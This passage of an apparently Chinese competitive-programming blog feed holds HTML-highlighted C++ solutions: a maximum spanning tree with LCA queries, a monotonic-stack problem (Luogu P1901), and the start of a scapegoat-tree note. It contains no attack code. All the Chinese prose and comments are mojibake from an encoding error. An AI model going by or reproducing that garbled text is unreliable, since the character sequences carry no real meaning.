class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> inf 1000000005</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Node</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> u,v,w;<span class=\"comment\">//ä¸¤ç‚¹u&amp;vä»¥åŠè¾¹æƒ</span></span><br><span class=\"line\">    <span class=\"type\">bool</span> <span class=\"keyword\">operator</span> &lt; (<span class=\"type\">const</span> Node &amp;b) <span class=\"type\">const</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> w&lt;b.w;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">vector &lt;Node&gt; e[<span class=\"number\">50005</span>];<span class=\"comment\">//e[u]å‚¨å­˜èŠ‚ç‚¹uç›¸è¿çš„è¾¹é›†ã€‚</span></span><br><span class=\"line\">priority_queue &lt;Node&gt; Q;<span class=\"comment\">//è¾¹æƒè¶Šå¤§çš„ä¼˜å…ˆçº§è¶Šé«˜</span></span><br><span class=\"line\"><span class=\"type\">int</span> fa[<span class=\"number\">50005</span>];<span class=\"comment\">//Kruskalçš„å¾¡ç”¨å¹¶æŸ¥é›†ï¼Œfa[u]ä»£è¡¨uç‚¹æ‰€å¤„é›†åˆ</span></span><br><span class=\"line\"><span class=\"type\">bool</span> vis[<span class=\"number\">50005</span>];<span class=\"comment\">//æ˜¯å¦å·²ç»è¢«dfsè¿‡ç¨‹è®¿é—®è¿‡</span></span><br><span class=\"line\"><span class=\"type\">int</span> fas[<span class=\"number\">50005</span>][<span class=\"number\">21</span>],minw[<span class=\"number\">50005</span>][<span class=\"number\">21</span>],deep[<span class=\"number\">50005</span>];</span><br><span class=\"line\"><span class=\"comment\">//fas[u][j]ä»£è¡¨uç‚¹åœ¨æ‰€å¤„æ ‘ä¸­çš„ç¬¬2^jçº§çˆ¶äº²ç¼–å·</span></span><br><span class=\"line\"><span class=\"comment\">//minw[u][j]ä»£è¡¨uç‚¹åœ¨æ‰€å¤„æ ‘ä¸­è‡³ç¬¬2^jçº§çˆ¶äº²çš„è·¯å¾„ä¸Šæœ€å°è¾¹æƒ</span></span><br><span class=\"line\"><span class=\"comment\">//deep[u]ä»£è¡¨uç‚¹åœ¨æ‰€å¤„æ ‘ä¸­æ·±åº¦</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"type\">int</span> x)</span><span class=\"comment\">//æŸ¥æ‰¾xæ‰€åœ¨é›†åˆç¼–å·</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x==fa[x]) <span class=\"keyword\">return</span> x;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> fa[x]=<span class=\"built_in\">find</span>(fa[x]);<span class=\"comment\">//è·¯å¾„å‹ç¼©</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">uni</span><span class=\"params\">(<span class=\"type\">int</span> a,<span class=\"type\">int</span> b)</span> <span class=\"comment\">//åˆå¹¶a,bæ‰€åœ¨é›†åˆ</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    fa[<span class=\"built_in\">find</span>(a)]=<span class=\"built_in\">find</span>(b);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"type\">int</span> u,<span class=\"type\">int</span> v,<span class=\"type\">int</span> w)</span> <span class=\"comment\">//æ·»åŠ æ–°å›¾è¾¹</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    Node one;</span><br><span class=\"line\">    one.u=u;</span><br><span class=\"line\">    one.v=v;</span><br><span class=\"line\">    one.w=w;</span><br><span class=\"line\">    e[u].<span class=\"built_in\">push_back</span>(one);</span><br><span class=\"line\">    <span class=\"built_in\">uni</span>(u,v);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">dfs</span><span class=\"params\">(<span class=\"type\">int</span> u,<span class=\"type\">int</span> f,<span class=\"type\">int</span> k)</span><span class=\"comment\">//dfsï¼Œuä»£è¡¨å½“å‰ç‚¹ï¼Œfä¸ºå½“å‰ç‚¹çˆ¶äº²ï¼Œkä¸ºæ·±åº¦</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    vis[u]=<span class=\"number\">1</span>;</span><br><span class=\"line\">    deep[u]=k;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;e[u].<span class=\"built_in\">size</span>();i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (e[u][i].v==f) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">dfs</span>(e[u][i].v,u,k+<span class=\"number\">1</span>);</span><br><span class=\"line\">            fas[e[u][i].v][<span class=\"number\">0</span>]=u;</span><br><span class=\"line\">            minw[e[u][i].v][<span class=\"number\">0</span>]=e[u][i].w;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> n,m,q;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Kruskal</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> linked=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(!Q.<span class=\"built_in\">empty</span>()&amp;&amp;linked&lt;n<span class=\"number\">-1</span>) &#123;<span class=\"comment\">//è¾¹æ•°må¯èƒ½å°‘äºn-1ï¼Œå› æ­¤éœ€è¦æ³¨æ„Qæ˜¯å¦ä¸ºç©º</span></span><br><span class=\"line\">        Node now=Q.<span class=\"built_in\">top</span>();</span><br><span class=\"line\">        Q.<span class=\"built_in\">pop</span>();</span><br><span class=\"line\">        <span class=\"type\">int</span> a=now.u,b=now.v;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">find</span>(a)==<span class=\"built_in\">find</span>(b)) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            linked++;</span><br><span class=\"line\">            <span class=\"built_in\">add</span>(a,b,now.w);</span><br><span class=\"line\">            <span class=\"built_in\">add</span>(b,a,now.w);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">lca</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> y)</span><span class=\"comment\">//æ±‚xï¼Œyçš„lca</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">find</span>(x)!=<span class=\"built_in\">find</span>(y)) <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;<span class=\"comment\">//ä¸åœ¨ä¸€ä¸ªæ ‘é‡Œ</span></span><br><span class=\"line\">    <span class=\"type\">int</span> ans=inf;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (deep[y] &gt;deep[x]) <span class=\"built_in\">swap</span>(x,y);<span class=\"comment\">//è¾ƒæ·±çš„æ ‡è®°ä¸ºx</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">20</span>;i&gt;=<span class=\"number\">0</span>;i--)<span class=\"comment\">//ä»¤xè·³åˆ°ä¸yç›¸åŒé«˜åº¦</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(deep[fas[x][i]]&gt;=deep[y])&#123;</span><br><span class=\"line\">            ans=<span class=\"built_in\">min</span>(ans,minw[x][i]);</span><br><span class=\"line\">            x=fas[x][i];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x==y) <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">20</span>; i&gt;=<span class=\"number\">0</span>; i--)<span class=\"comment\">//è®©x,yä¸€èµ·è·³åˆ°lcaèŠ‚ç‚¹ä¸‹æ–¹</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(fas[x][i]!=fas[y][i])&#123;</span><br><span class=\"line\">            ans=<span class=\"built_in\">min</span>(ans,<span class=\"built_in\">min</span>(minw[x][i],minw[y][i]));</span><br><span class=\"line\">            x=fas[x][i]; </span><br><span class=\"line\">            y=fas[y][i];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ans=<span class=\"built_in\">min</span>(ans,<span class=\"built_in\">min</span>(minw[x][<span class=\"number\">0</span>],minw[y][<span class=\"number\">0</span>]));<span class=\"comment\">//ç»Ÿè®¡æœ€å°è¾¹æƒ</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">        fa[i]=i;<span class=\"comment\">//å¹¶æŸ¥é›†é¢„å¤„ç†ï¼Œå„ä¸ªç‚¹éƒ½å¤„äºè‡ªå·±æ‰€ä»£è¡¨çš„é›†åˆ</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=m;i++) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> x,y,z;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d%d&quot;</span>,&amp;x,&amp;y,&amp;z);</span><br><span class=\"line\">        Node one;</span><br><span class=\"line\">        one.u=x;</span><br><span class=\"line\">        one.v=y;</span><br><span class=\"line\">        one.w=z;</span><br><span class=\"line\">        Q.<span class=\"built_in\">push</span>(one);<span class=\"comment\">//åŠ å…¥Kruskalå¾¡ç”¨é˜Ÿåˆ—Q</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">Kruskal</span>();<span class=\"comment\">//æœ€å¤§ç”Ÿæˆæ ‘</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++) &#123;<span class=\"comment\">//å€å¢æ•°ç»„åˆå§‹åŒ–&amp;dfs</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!vis[i]) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">dfs</span>(i,<span class=\"number\">0</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">            fas[i][<span class=\"number\">0</span>]=i;</span><br><span class=\"line\">            minw[i][<span class=\"number\">0</span>]=inf;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=<span class=\"number\">20</span>;i++) &#123;<span class=\"comment\">//å€å¢é¢„å¤„ç†</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j=<span class=\"number\">1</span>;j&lt;=n;j++) &#123;</span><br><span class=\"line\">            fas[j][i]=fas[fas[j][i<span class=\"number\">-1</span>]][i<span class=\"number\">-1</span>];</span><br><span class=\"line\">            minw[j][i]=<span class=\"built_in\">min</span>(minw[j][i<span class=\"number\">-1</span>],minw[fas[j][i<span class=\"number\">-1</span>]][i<span class=\"number\">-1</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;q);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=q;i++) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> a,b;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,<span class=\"built_in\">lca</span>(a,b));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>",
            "tags": [
                "å›¾è®º",
                "Kruskal"
            ]
        },
        {
            "id": "http://cubicy.icu/2018/09/28/%E6%B4%9B%E8%B0%B7P1901%20%E5%8F%91%E5%B0%84%E7%AB%99/",
            "url": "http://cubicy.icu/2018/09/28/%E6%B4%9B%E8%B0%B7P1901%20%E5%8F%91%E5%B0%84%E7%AB%99/",
            "title": "æ´›è°·:P1901 å‘å°„ç«™",
            "date_published": "2018-09-28T05:11:00.000Z",
            "content_html": "<p>åŸé¢˜åœ°å€:<a href>https://www.luogu.org/problemnew/show/P1901</a>  </p>\n<h3 id=\"é¢˜ç›®ç®€è¿°\"><a href=\"#é¢˜ç›®ç®€è¿°\" class=\"headerlink\" title=\"é¢˜ç›®ç®€è¿°\"></a>é¢˜ç›®ç®€è¿°</h3><p>æœ‰ N ä¸ªèƒ½é‡å‘å°„ç«™æ’æˆä¸€è¡Œï¼Œæ¯ä¸ªéƒ½æœ‰**ä¸ç›¸åŒçš„é«˜åº¦ $H_i$**ï¼Œèƒ½å‘ä¸¤è¾¹ï¼ˆå½“ç„¶ä¸¤ç«¯çš„åªèƒ½å‘ä¸€è¾¹ï¼‰åŒæ—¶å‘å°„èƒ½é‡å€¼ä¸º$V_i$ çš„èƒ½é‡ï¼Œå¹¶ä¸”å‘å‡ºçš„èƒ½é‡åªè¢«ä¸¤è¾¹æœ€è¿‘çš„ä¸”æ¯”å®ƒé«˜çš„å‘å°„ç«™æ¥æ”¶ã€‚</p>\n<p>æ˜¾ç„¶ï¼Œæ¯ä¸ªå‘å°„ç«™å‘æ¥çš„èƒ½é‡æœ‰å¯èƒ½è¢«0æˆ–1æˆ–2ä¸ªå…¶ä»–å‘å°„ç«™æ‰€æ¥å—ï¼Œæ±‚æ¥æ”¶æœ€å¤šèƒ½é‡çš„å‘å°„ç«™æ¥æ”¶çš„èƒ½é‡æ˜¯å¤šå°‘ã€‚</p>\n<hr>\n<h3 id=\"æ€è·¯\"><a href=\"#æ€è·¯\" class=\"headerlink\" title=\"æ€è·¯\"></a>æ€è·¯</h3><p>æ¯ä¸ªèƒ½é‡å¡”å°„å‡ºçš„èƒ½é‡è¢«å·¦å³ç¬¬ä¸€ä¸ªæ¯”å…¶é«˜çš„å¡”æ‰€æ‹¦æˆªã€‚éšéšçº¦çº¦è§‰å¾—å¯ä»¥ç”¨å•è°ƒæ ˆæâ€¦â€¦<br>ç»´æŠ¤ä¸€ä¸ªé«˜åº¦å•è°ƒä¸å‡æ ˆï¼Œè€ƒè™‘<strong>ä¾æ¬¡</strong>å°†èƒ½é‡å¡”iåŠ å…¥æ ˆï¼š  </p>\n<ol>\n<li>å¦‚æœé«˜åº¦æ¯”æ ˆé¡¶å…ƒç´ å¤§æˆ–æ ˆç©ºï¼Œæ ˆé¡¶å…ƒç´ èƒ½é‡åŠ ä¸Š$V_i$ï¼Œå‹å…¥æ ˆ;  </li>\n<li>å¦‚æœé«˜åº¦æ¯”æ ˆé¡¶å…ƒç´ å°ï¼ˆæ ˆé¡¶å…ƒç´ ç¼–å·è®°ä¸ºtopï¼‰ï¼Œå½“å‰èƒ½é‡å¡”iæ¥æ”¶çš„èƒ½é‡åŠ ä¸Š$V_{top}$ï¼Œå¼¹å‡ºæ ˆé¡¶å…ƒç´ ã€‚é‡å¤æ‰§è¡Œç›´åˆ°ç¬¦åˆæƒ…å†µ1ï¼ŒæŒ‰1çš„å¤„ç†æ–¹æ³•å¤„ç†ã€‚<br>æœ€åç›´æ¥æ‰«æä¸€éæœ€å¤§å€¼ï¼Œè¾“å‡ºã€‚</li>\n</ol>\n<hr>\n<h3 id=\"ä»£ç \"><a href=\"#ä»£ç \" class=\"headerlink\" title=\"ä»£ç \"></a>ä»£ç </h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"type\">int</span> s1[<span class=\"number\">1000010</span>],h[<span class=\"number\">1000010</span>],v[<span class=\"number\">1000010</span>],sum[<span class=\"number\">1000010</span>],ans,n,top;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;n);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d&quot;</span>,&amp;h[i],&amp;v[i]);</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(top&amp;&amp;h[s1[top]]&lt;h[i])</span><br><span class=\"line\">            sum[i]+=v[s1[top]],top--;</span><br><span class=\"line\">        sum[s1[top]]+=v[i];</span><br><span class=\"line\">        top++;</span><br><span class=\"line\">        s1[top]=i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">        ans=<span class=\"built_in\">max</span>(ans,sum[i]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d&quot;</span>,ans);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>",
            "tags": [
                "Stack"
            ]
        },
        {
            "id": "http://cubicy.icu/2018/08/03/%E6%9B%BF%E7%BD%AA%E7%BE%8A%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "url": "http://cubicy.icu/2018/08/03/%E6%9B%BF%E7%BD%AA%E7%BE%8A%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "title": "æ›¿ç½ªç¾Šæ ‘å­¦ä¹ ç¬”è®°",
            "date_published": "2018-08-03T08:53:00.000Z",
            "content_html": "<p>åšå®¢å’•å’•å’•äº†å¥½ä¹…â€¦â€¦æœ€è¿‘ä¼šé€æ­¥ç»§ç»­æ¢å¤æ›´æ–°åšå®¢çš„ã€‚<br>æœ€è¿‘åˆåœ¨å­¦ä¹ äºŒå‰æœç´¢æ ‘ã€‚å®æµ‹å‘ç°æ›¿ç½ªç¾Šæ ‘å¿«çš„é£èµ·(æ—¶é—´çº¦Splayçš„1&#x2F;2)~å†™èµ·æ¥è¿˜æ¯”è¾ƒç®€å•ï¼Œå†³å®šæ¥ä¸€æ³¢ã€‚<br>ï¼ˆé‚£ä¸ºä»€ä¹ˆè¿˜è¦ç”¨Splayå‘¢ï¼Ÿå› ä¸ºSplayæ˜¯åºåˆ—ä¹‹ç‹ï¼è¿˜èƒ½ç»´æŠ¤LCTï¼ï¼ˆä½ è¦ç”¨éæ—‹Treapï¼ˆFHQ-Treapï¼‰æˆ‘ä¹Ÿæ²¡æ„è§ï¼‰ï¼‰<br>æ›¿ç½ªç¾Šæ ‘çš„ä¸»è¦æ€æƒ³å°±æ˜¯å½“å‡ºç°é‡é‡å¤±è¡¡çš„æ—¶å€™ï¼Œ<strong>æŠŠç½ªé­ç¥¸é¦–çš„é‚£ä¸ªå­æ ‘æ‹å‡ºæ¥ï¼Œé‡æ–°æŒ‰æœ€å®Œç¾çš„æ–¹å¼ï¼ˆä¹Ÿå°±æ˜¯è¿‘ä¼¼å®Œå…¨äºŒå‰æ ‘ï¼‰æ„é€ ä¸€éå†æ¥å›å»</strong>ã€‚<br>å¦‚ä½•å®šä¹‰æŸä¸ªå­æ ‘ä¸å¹³è¡¡ï¼šå½“è¿™ä¸ªå­æ ‘çš„å·¦å³å­æ ‘å…¶ä¸­ä¹‹ä¸€çš„â€œé‡é‡â€ï¼ˆèŠ‚ç‚¹ä¸ªæ•°ï¼‰è¶…è¿‡äº†æ•´ä¸ªå­æ ‘çš„Î±*100%æ—¶ï¼Œæˆ‘ä»¬è®¤ä¸ºè¿™ä¸ªå­æ ‘ä¸å¹³è¡¡ã€‚<br>ä¸¾ä¾‹ï¼šÎ±&#x3D;0.75æ—¶ï¼Œå¦‚æœä¸€ä¸ªå­æ ‘å·¦å­æ ‘æœ‰4ä¸ªèŠ‚ç‚¹ï¼Œå³å­æ ‘æœ‰1ä¸ªï¼Œè¿™ä¸ªå­æ ‘å¤§å°å°±æ˜¯4+1+1&#x3D;6ï¼Œå·¦å­æ ‘å æ¯”è¶…è¿‡äº†Î±*100%ï¼ˆå³75%ï¼‰ï¼Œè¿™ä¸ªå­æ ‘ä¸å¹³è¡¡ï¼Œéœ€è¦é‡æ„ã€‚<br>æ˜¾ç„¶ï¼ŒÎ±å–å€¼ä»‹äº0.5è‡³1.0ä¹‹é—´ï¼Œè¶Šå°æ ‘è¶Šå¹³è¡¡ä½†é‡æ„æ¬¡æ•°è¶Šå¤šï¼Œè¶Šå¤§é‡æ„æ¬¡æ•°è¶Šå°‘ä½†æ ‘è¶Šä¸å¹³è¡¡ã€‚å¤ªå¤§å¤ªå°éƒ½ä¼šå‡ºäº‹ã€‚<strong>ä¸€èˆ¬è€Œè¨€ï¼ŒÎ±å–0.75</strong>ã€‚å¦‚æœé¢˜ç›®æŸ¥è¯¢æ¬¡æ•°è¿œå¤§äºæ’å…¥æ¬¡æ•°ï¼Œå¯ç•¥å¾®é™ä½Î±å–å€¼ï¼ˆæ¯”å¦‚Î±&#x3D;0.70ï¼‰ï¼›è‹¥è¿œå°äºï¼Œåˆ™ç•¥å‡é«˜ï¼ˆå¦‚Î±&#x3D;0.80ï¼‰ã€‚<br>ä¸‹é¢ä»¥<a href=\"https://www.luogu.org/problemnew/show/P3369\">æ´›è°·3369ã€æ¨¡æ¿ã€‘æ™®é€šå¹³è¡¡æ ‘</a>ä¸ºä¾‹ï¼š  </p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span 